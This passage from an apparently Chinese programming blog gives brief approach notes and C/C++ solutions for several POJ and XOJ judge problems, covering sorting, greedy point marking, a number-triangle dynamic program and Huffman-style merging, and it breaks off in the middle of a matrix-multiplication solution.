<h3 id="提交-5"><a href="#提交-5" class="headerlink" title="提交"></a>提交</h3><h4 id="stl"><a href="#stl" class="headerlink" title="stl"></a>stl</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 100005</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">int</span> arr[MAX];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;arr[i]);</div><div class="line">    &#125;</div><div class="line">    sort(arr,arr+n);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,arr[n/<span class="number">2</span>]);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="快排"><a href="#快排" class="headerlink" title="快排"></a>快排</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 100005</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">int</span> arr[MAX];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> h)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span>(h&lt;l+<span class="number">2</span>)<span class="keyword">return</span> ;</div><div class="line">    <span class="keyword">int</span> e=h,p=l;</div><div class="line">    <span class="keyword">while</span>(l&lt;h)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">while</span>(++l&lt;e &amp;&amp; arr[l]&lt;=arr[p]);</div><div class="line">        <span class="keyword">while</span>(--h&gt;p &amp;&amp; arr[h]&gt;=arr[p]);</div><div class="line">        <span class="keyword">if</span>(l&lt;h) swap(arr[l],arr[h]);</div><div class="line">    &#125;</div><div class="line">    swap(arr[h],arr[p]);</div><div class="line">    quick_sort(p,h);</div><div class="line">    quick_sort(l,e);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;arr[i]);</div><div class="line">    &#125;</div><div class="line">    quick_sort(<span class="number">0</span>,n);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,arr[n/<span class="number">2</span>]);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="3069"><a href="#3069" class="headerlink" title="3069"></a>3069</h2><h3 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=3069" target="_blank" rel="external">http://poj.org/problem?id=3069</a></p>
<h3 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h3><p>贪心算法。在 <code>while( i &lt; n )</code> 循环中，第一个while循环，找到距离当前点（未覆盖）大于r的第一个点，该点的前一个（i—）做上标记。第二个while循环，从已经标记的点出发，找到距离当前点（已经覆盖）大于r的第一个点，并将其作为下一次大循环的起点。</p>
<h3 id="提交-6"><a href="#提交-6" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> N 1005</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">int</span> r;</div><div class="line"><span class="keyword">int</span> loc[N];</div><div class="line"><span class="keyword">int</span> marknum;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;r,&amp;n);</div><div class="line">    <span class="keyword">while</span> ( n != <span class="number">-1</span> &amp;&amp; r != <span class="number">-1</span>)&#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;loc[i]);</div><div class="line">        sort(loc,loc+n);</div><div class="line">        marknum = <span class="number">0</span>;</div><div class="line"></div><div class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</div><div class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</div><div class="line">        <span class="keyword">while</span> ( i &lt; n )&#123;</div><div class="line">            <span class="keyword">while</span> ( i &lt; n &amp;&amp; loc[j] + r &gt;= loc[i] )</div><div class="line">                i++;</div><div class="line">            i--;</div><div class="line">            marknum++;</div><div class="line">            j = i;</div><div class="line"></div><div class="line">            <span class="keyword">while</span> ( i &lt; n &amp;&amp; loc[j] + r &gt;= loc[i])</div><div class="line">                i++;</div><div class="line"></div><div class="line">            j = i;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,marknum);</div><div class="line"></div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;r,&amp;n);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="3176"><a href="#3176" class="headerlink" title="3176"></a>3176</h2><h3 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=3176" target="_blank" rel="external">http://poj.org/problem?id=3176</a></p>
<h3 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h3><p>二维数组triangle用于保存三角形，二维数组way用于保存路径。<br>以题目数据为例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">7</div><div class="line">3 8</div><div class="line">8 1 0</div><div class="line">2 7 4 4</div><div class="line">4 5 2 6 5</div></pre></td></tr></table></figure></p>
<p>分为三种情况：</p>
<ul>
<li>最左边，只能从上一行的同列来，way[i][j] = way[i-1][j] + triangle[i][j]</li>
<li>最右边，只能从上一行的斜对角线来，way[i-1][j-1] + triangle[i][j];</li>
<li>中间，可以从上一行的左边或者右边来，way[i][j] = max(way[i-1][j],way[i-1][j-1]) + triangle[i][j];</li>
</ul>
<p>填表完成后，对最后一行way[n-1][]找出最大值即为答案。</p>
<h3 id="提交-7"><a href="#提交-7" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 355</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> way[MAX][MAX] = &#123;<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">int</span> triangle[MAX][MAX] = &#123;<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;triangle[i][j]);</div><div class="line"></div><div class="line">    way[<span class="number">0</span>][<span class="number">0</span>] = triangle[<span class="number">0</span>][<span class="number">0</span>];</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> ( j == <span class="number">0</span> )</div><div class="line">            &#123;</div><div class="line">                way[i][j] = way[i<span class="number">-1</span>][j] + triangle[i][j];</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( j == i )</div><div class="line">            &#123;</div><div class="line">                way[i][j] = way[i<span class="number">-1</span>][j<span class="number">-1</span>] + triangle[i][j];</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span></div><div class="line">            &#123;</div><div class="line">                way[i][j] = max(way[i<span class="number">-1</span>][j],way[i<span class="number">-1</span>][j<span class="number">-1</span>]) + triangle[i][j];</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">    <span class="keyword">int</span> lastrow = n - <span class="number">1</span>;</div><div class="line">    <span class="keyword">int</span> res = way[lastrow][<span class="number">0</span>];</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; n; j++)&#123;</div><div class="line">        <span class="keyword">if</span> (way[lastrow][j] &gt; res )</div><div class="line">            res = way[lastrow][j];</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, res);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="3253"><a href="#3253" class="headerlink" title="3253"></a>3253</h2><h3 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=3253" target="_blank" rel="external">http://poj.org/problem?id=3253</a></p>
<h3 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h3><p>霍夫曼树的变形。<br>重点在于对两个最小值相加后对数组的处理。</p>
<h3 id="提交-8"><a href="#提交-8" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">int</span> k;</div><div class="line"><span class="keyword">int</span> len[<span class="number">20005</span>];</div><div class="line"><span class="keyword">int</span> total;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">while</span> ( n &gt; <span class="number">1</span> )&#123;</div><div class="line">        <span class="keyword">int</span> mii1 = <span class="number">0</span>;</div><div class="line">        <span class="keyword">int</span> mii2 = <span class="number">1</span>;</div><div class="line">        <span class="keyword">if</span> (len[mii1] &gt; len[mii2])</div><div class="line">            swap(mii1,mii2);</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; n; i++)&#123;</div><div class="line">            <span class="keyword">if</span> (len[i] &lt; len[mii1])&#123;</div><div class="line">                mii2 = mii1;</div><div class="line">                mii1 = i;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (len[i] &lt; len[mii2])&#123;</div><div class="line">                mii2 = i;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">int</span> t = len[mii1] + len[mii2];</div><div class="line">        ans += t;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (mii1 == n<span class="number">-1</span>)</div><div class="line">            swap(mii1,mii2);</div><div class="line">        len[mii1] = t;</div><div class="line">        len[mii2] = len[n<span class="number">-1</span>];</div><div class="line">        n--;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,ans);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    total = <span class="number">0</span>;</div><div class="line">    k = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;len[i]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    solve();</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="3617"><a href="#3617" class="headerlink" title="3617"></a>3617</h2><h3 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=3617" target="_blank" rel="external">http://poj.org/problem?id=3617</a></p>
<h3 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h3><p>贪心算法，每次选择排序靠前的字母加到字符串t中。如果两个排序相同，则看它们的下一个字母的顺序，可以使用一个递归函数来判断。</p>
<h3 id="提交-9"><a href="#提交-9" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">char</span> s[<span class="number">2005</span>];</div><div class="line"><span class="keyword">char</span> t[<span class="number">2005</span>];</div><div class="line"><span class="keyword">int</span> sp,ep;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span> (s[i] &gt; s[j])&#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (s[i] &lt; s[j])&#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (s[i] == s[j])&#123;</div><div class="line">        i++;</div><div class="line">        j--;</div><div class="line">        <span class="keyword">return</span> compare(i,j);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">" %c"</span>,&amp;s[i]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    sp = <span class="number">0</span>;</div><div class="line">    ep = n<span class="number">-1</span>;</div><div class="line">    <span class="keyword">int</span> lenoft = <span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span> (lenoft != n)&#123;</div><div class="line">        <span class="keyword">int</span> p = compare(sp,ep);</div><div class="line">        <span class="keyword">if</span> (p == <span class="number">0</span>)&#123;</div><div class="line">            t[lenoft] = s[sp];</div><div class="line">            sp++;</div><div class="line">            lenoft++;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p == <span class="number">1</span>)&#123;</div><div class="line">            t[lenoft] = s[ep];</div><div class="line">            ep--;</div><div class="line">            lenoft++;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>,t[i<span class="number">-1</span>]);</div><div class="line">        <span class="keyword">if</span> (i % <span class="number">80</span> == <span class="number">0</span>)</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="XOJ"><a href="#XOJ" class="headerlink" title="XOJ"></a>XOJ</h1><h2 id="1004"><a href="#1004" class="headerlink" title="1004"></a>1004</h2><h3 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h3><p>冒泡等可能会超时。堆排序和快排的复杂度都是 O(nlogn)。课上为了节约时间所以：）</p>
<h3 id="提交-10"><a href="#提交-10" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> arrays[<span class="number">1000004</span>];</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n;i++)</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;arrays[i]);</div><div class="line">    sort(arrays,arrays+n);</div><div class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; n - <span class="number">1</span>;j++)</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,arrays[j]);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,arrays[n - <span class="number">1</span>]);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>oj对格式要求好严格…</p>
<h2 id="1005"><a href="#1005" class="headerlink" title="1005"></a>1005</h2><p>此题另写一篇文章了。</p>
<h2 id="1022"><a href="#1022" class="headerlink" title="1022"></a>1022</h2><h3 id="想法-1"><a href="#想法-1" class="headerlink" title="想法"></a>想法</h3><p>直接用普通的矩阵乘法就过了，<br>时间复杂度 O(<script type="math/tex">n^3</script>)</p>
<h3 id="提交-11"><a href="#提交-11" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> n1,m1;</div><div class="line">    <span class="keyword">int</span> n2,m2;</div><div class="line">    <span class="keyword">int</span> matrix1[<span class="number">100</span>][<span class="number">100</span>];</div><div class="line">    <span class="keyword">int</span> matrix2[<span class="number">100</span>][<span class="number">100</span>];</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n1,&amp;m1);</div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n1;i++)</div><div class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; m1;j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;matrix1[i][j]);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n2,&amp;m2);</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n2;i++)</div><div class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; m2;j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;matrix2[i][j]);</div><div class="line"></div><div class="line">    <span class="keyword">int</span> matrix3[<span class="number">100</span>][<span class="number">100</span>];</div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n1;i++)</div><div class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; m2;j++)</div><div class="line">            matrix3[i][j]=<span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> i1,j2;</div><div class="line">    <span class="keyword">for</span>(i1 = <span class="number">0</span>;i1 &lt; 